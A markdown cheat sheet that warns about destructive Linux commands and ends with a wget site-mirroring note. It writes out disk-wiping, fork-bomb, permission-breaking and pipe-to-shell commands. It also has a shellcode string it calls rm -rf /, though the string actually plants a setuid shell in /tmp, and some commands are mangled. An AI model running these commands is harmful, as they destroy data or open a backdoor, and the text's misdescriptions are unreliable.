# Dangerous Linux Commands

1.  Code:
    This command will recursively and forcefully delete all the files inside the root directory.


    rm -rf /

2.  Code:
    This is the hex version of [rm -rf /] that can deceive even the rather experienced Linux users.


    char esp[] _attribute_ ((section(".text"))) /* e.s.p
    release */
    = "\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68"
    "\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99"
    "\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7"
    "\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56"
    "\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31"
    "\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69"
    "\x6e\x2f\x73\x68\x00\x2d\x63\x00"
    "cp -p /bin/sh /tmp/.beyond; chmod 4755
    /tmp/.beyond;";

3.  Code:
    mkfs.ext3 /dev/sda

This will reformat or wipeout all the files of the device that is mentioned after the mkfs command.

4.  Code:
    :(){:|:&};:

Known as fork bomb, this command will tell your system to execute a huge number of processes until the system freezes. This can often lead to corruption of data.

5.  Code:
    any_command > /dev/sda

With this command, raw data will be written to a block device that can usually clobber the filesystem resulting in total loss of data.

6.  Code:
    wget <http://some_untrusted_source> O | sh

Never download from untrusted sources, and then execute the possibly malicious codes that they are giving you.

7.  Code:
    mv ~/_ /dev/null
    mv /home/yourhomedirectory/_ /dev/null

This command will move all the files inside your home directory to a place that doesn't exist; hence you will never ever see those files again.

8.  Code:
    dd if=/dev/urandom of=/dev/sda

This command fill your hard disk partition with some random data

9.  Code:
    chmod -R 777 /

This comand make your system world writable.

10. Code:
    chmod 000 -R /
    chown nobody:nobody -R /

This command removes all the access priviledge from all the users except root

11. Code:
    yes > /dev/sda

This command fill your hard disk with the character 'y'

12.Code:
rm -rf /boot/
Description:
Will delete Kernel , Initrd , and GRUB/LILO Files
(Needed for Linux Startup)

rm /boot/vmlinux
rm /boot/vmlinuz
rm /boot/vmlinux_
rm /boot/vmlinuz_
Delete the Linux kernel

rm /bin/init
cd / ; find -iname init -exec rm -rf {} \\;

Deletes any file with "init" in it including /sbin/init.

### wget

**Download Entire Website**
This command downloads the Web site www.website.com:
```shell
    wget -m --wait=9 --limit-rate=10K http://website.com
```
Alternative with more options:
```shell
    wget --recursive --no-clobber --page-requisites --html-extension --convert-links --restrict-file-names=windows --domains website.org --no-parent www.website.com/
```
Options:
```shell
-   \--recursive: download the entire Web site.
-   \--domains website.org: don't follow links outside website.org.
-   \--page-requisites: get all the elements that compose the page (images, CSS and so on).
-   \--no-parent: don't follow links outside the directory tutorials/html/.
-   \--html-extension: save files with the .html extension.
-   \--restrict-file-names=windows: modify filenames so that they will work in Windows as well.
-   \--convert-links: convert links so that they work locally, off-line.
-   \--no-clobber: don't overwrite any existing files (used in case the download is interrupted and resumed).
```
